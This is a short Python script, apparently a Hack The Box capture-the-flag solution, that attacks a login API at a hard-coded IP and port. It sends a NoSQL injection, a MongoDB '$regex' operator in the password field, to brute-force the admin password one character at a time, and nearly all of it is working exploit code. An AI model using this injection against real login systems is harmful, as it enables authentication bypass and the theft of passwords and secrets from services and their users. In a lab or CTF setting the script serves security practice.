from requests import post

url = "http://94.237.63.93:48766/api/login"
flag = "HTB{"
listChar = "!@_{}-abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

while True:
    for i in listChar:
        data = {"username": "admin", "password": {"$regex": f"^{flag+i}" }}
        response = post(url, json=data)
        if "Login Failed" not in response.text:
            flag += i
            print(flag)
            break
    else:
        break
print("Flag: " + flag)